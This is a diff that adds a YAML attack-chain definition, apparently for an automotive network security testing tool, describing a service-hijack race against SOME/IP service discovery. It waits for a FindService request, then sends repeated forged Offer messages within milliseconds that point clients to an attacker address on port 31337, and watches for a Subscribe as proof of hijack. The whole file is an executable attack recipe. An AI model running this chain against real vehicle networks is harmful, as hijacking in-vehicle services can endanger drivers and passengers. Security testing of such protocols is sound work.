@@ -1,0 +1,49 @@
+id: AC-006
+name: 恶意 Offer 竞速攻击链
+description: >
+  监听合法服务的 FindService 请求，与合法服务器竞争 Offer 时序，
+  通过极短延迟（<10ms）抢先发送恶意 Offer，利用时序竞争实现服务劫持。
+severity: high
+cvss: 8.0
+
+steps:
+  - id: listen_find
+    action: wait_for
+    filter:
+      message_type: SD
+      sd_entry_type: FindService
+    timeout: 30
+
+  - id: race_malicious_offer_1
+    action: send
+    template: sd_offer
+    params:
+      service_id: "${listen_find.service_id}"
+      instance_id: "0x0001"
+      addr: "${attacker_ip}"
+      port: 31337
+      ttl: 60
+    delay_ms: 0
+
+  - id: race_malicious_offer_2
+    action: send
+    template: sd_offer
+    params:
+      service_id: "${listen_find.service_id}"
+      instance_id: "0x0001"
+      addr: "${attacker_ip}"
+      port: 31337
+      ttl: 60
+    delay_ms: 5
+    repeat: 3
+
+  - id: confirm_hijack
+    action: wait_for
+    filter:
+      message_type: SD
+      sd_entry_type: Subscribe
+    timeout: 10
+    required: false
+
+success_criteria:
+  race_malicious_offer_1_completed: true
